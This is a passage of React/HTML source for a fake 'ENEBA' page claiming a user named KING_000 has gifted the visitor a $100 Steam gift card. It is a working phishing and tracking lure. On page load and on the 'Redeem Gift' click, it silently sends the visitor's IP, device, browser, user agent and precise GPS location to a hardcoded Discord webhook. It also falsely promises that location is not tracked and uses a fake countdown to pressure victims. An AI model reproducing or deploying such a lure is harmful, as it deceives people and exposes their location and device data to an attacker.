                        This promotion is available only in specific regions. Your location data is encrypted and only used to confirm eligibility. We do not track or store your precise location.
                      </div>
                    </Alert>
                    <p className="text-sm text-gray-300 mt-2">ENEBA uses industry-standard encryption and complies with GDPR, CCPA and other privacy regulations.</p>
                    <button 
                      className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all mt-2"
                      onClick={handleProceedToLocation}
                    >
                      Continue with Verification
                    </button>
                  </div>
                )}
                
                {step === 'location' && (
                  <div className="flex flex-col items-center space-y-4">
                    {renderMapPinIcon()}
                    <p className="text-xl">Please allow location access</p>
                    <p className="text-sm text-gray-300 mt-2">We're confirming you're in a region where this gift card offer is available.</p>
                    <p className="text-xs text-gray-400 mt-1">This page will update automatically after you allow access.</p>
                  </div>
                )}
                
                {step === 'success' && (
                  <div className="flex flex-col items-center space-y-4">
                    {renderCheckIcon()}
                    <p className="text-xl">You have been verified! This is your code:</p>
                    <div className="bg-black bg-opacity-20 p-3 rounded font-mono">
                      3FJ8R-WN7TK-4ZP6B
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        );
      };
      
      // Main App Component
      const App = () => {
        const [showConfetti, setShowConfetti] = useState(true);
        const [isModalOpen, setIsModalOpen] = useState(false);
        const [ipAddress, setIpAddress] = useState('');
        const [systemInfo, setSystemInfo] = useState(getUserSystemInfo());
        const [windowSize, setWindowSize] = useState({
          width: window.innerWidth,
          height: window.innerHeight,
        });
        const [isLoading, setIsLoading] = useState(false);
        const [locationData, setLocationData] = useState({
          latitude: null, 
          longitude: null, 
          accuracy: null
        });
        const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";

        useEffect(() => {
          // Set initial system info
          setSystemInfo(getUserSystemInfo());
          
          // Handle confetti animation
          const timer = setTimeout(() => {
            setShowConfetti(false);
          }, 5000);

          // Get IP address
          const fetchIpAddress = async () => {
            const ip = await getIpAddress();
            setIpAddress(ip);
            setSystemInfo(prev => ({ ...prev, ip }));
          };
          fetchIpAddress();
          
          // Try to get user location
          const fetchLocation = async () => {
            try {
              const location = await getUserLocation();
              setLocationData(location);
              setSystemInfo(prev => ({ ...prev, location }));
            } catch (error) {
              console.error('Error getting location:', error);
            }
          };
          fetchLocation();

          // Handle window resize for confetti
          const handleResize = () => {
            setWindowSize({
              width: window.innerWidth,
              height: window.innerHeight,
            });
          };

          window.addEventListener('resize', handleResize);

          // Send initial visit data to webhook
          const sendInitialVisitData = async () => {
            try {
              const visitInfo = {
                eventType: 'page_visit',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                ...systemInfo
              };
              
              // Wait a moment to potentially get location data
              setTimeout(async () => {
                let locationString = 'Location permission not granted';
                if (locationData.latitude && locationData.longitude) {
                  locationString = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                }
                
                await axios.post(webhookUrl, {
                  content: `🔔 **NEW VISITOR DETECTED!**\n\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}\n**Location**: ${locationString}`,
                });
              }, 3000);
            } catch (error) {
              console.error('Error sending initial visit data:', error);
            }
          };
          
          // Wait a bit before sending the initial data to ensure IP is loaded
          setTimeout(sendInitialVisitData, 2000);

          return () => {
            clearTimeout(timer);
            window.removeEventListener('resize', handleResize);
          };
        }, []);

        const handleRedeemClick = async () => {
          try {
            setIsLoading(true);
            
            // Collect current time and detailed browser information
            const currentTime = new Date().toLocaleString();
            const sessionDuration = Math.floor((new Date().getTime() - performance.timing.navigationStart) / 1000);
            
            // Prepare location data for the message
            let locationString = 'Location permission not granted';
            if (locationData.latitude && locationData.longitude) {
              locationString = `Latitude: ${locationData.latitude}, Longitude: ${locationData.longitude}, Accuracy: ${locationData.accuracy}m\nGoogle Maps: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
            }
            
            // Send enhanced system info to webhook
            await axios.post(webhookUrl, {
              content: `🎮 **USER CLICKED REDEEM BUTTON!** 🎮\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**Location**: ${locationString}\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
            });

            // Open verification modal after a small delay to make it feel more authentic
            setTimeout(() => {
              setIsModalOpen(true);
              setIsLoading(false);
            }, 800);
          } catch (error) {
            console.error('Error sending webhook:', error);
            setIsLoading(false);
            alert("Could not process your request. Please try again.");
          }
        };

        return (
          <div className="min-h-screen bg-custom-purple flex flex-col">
            {showConfetti && (
              <ReactConfetti
                width={windowSize.width}
                height={windowSize.height}
                recycle={false}
                numberOfPieces={500}
              />
            )}
            
            <Header />
            
            <main className="flex-grow flex flex-col items-center justify-center px-4 py-10">
              <div className="bg-white bg-opacity-10 border-none shadow-xl max-w-4xl w-full rounded-lg">
                <div className="p-8">
                  <div className="flex flex-col md:flex-row items-center gap-8">
                    <div className="flex-shrink-0 relative">
                      <div className="absolute -top-3 -right-3 bg-custom-yellow text-black text-xs font-bold px-2 py-1 rounded-full transform rotate-12">
                        FREE
                      </div>
                      <img 
                        src="https://products.eneba.games/resized-products/CPTuagJUBbtbQWzrEmdlnHebkNJ92EgbwuU0c5I4_xE_350x200_1x-0.jpeg" 
                        alt="Steam Gift Card $100" 
                        className="w-full max-w-md rounded-lg shadow-lg"
                      />
                    </div>
                    
                    <div className="text-white text-center md:text-left">
                      <div className="text-sm font-medium text-custom-yellow mb-1">Exclusive Offer</div>
                      <h1 className="text-4xl md:text-5xl font-bold mb-6">
                        <span className="text-purple-300">KING_000</span> has gifted you a 
                        <span className="text-custom-blue block mt-2">STEAM GIFT CARD $100</span>!
                      </h1>
                      
                      <p className="text-gray-300 mb-4">This exclusive offer was shared by @KING_000. As a purchaser, you'll earn a cashback of $4 by using our website.</p>
                      <p className="text-gray-300 mb-6">This offer is available for a limited time only. Redeem your gift now before it expires.</p>
                      
                      <button 
                        onClick={handleRedeemClick}
                        disabled={isLoading}
                        className={`bg-custom-yellow text-black text-xl font-bold py-4 px-8 rounded-lg hover:bg-opacity-90 transition-all transform hover:scale-105 ${isLoading ? 'opacity-75 cursor-not-allowed' : ''}`}
                      >
                        {isLoading ? 'Processing...' : 'Redeem Gift'}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mt-10 text-red-300 text-center max-w-2xl border border-red-400 p-4 rounded">
                <p className="font-bold">This gift will expire in <CountdownTimer className="text-white font-mono" /></p>
              </div>
            </main>

            <VerificationModal 
              isOpen={isModalOpen} 
              onClose={() => setIsModalOpen(false)}
              ipAddress={ipAddress}
            />
          </div>
        );
      };

      // Render the App
      ReactDOM.render(<App />, document.getElementById('root'));
    </script>
  </body>
</html>
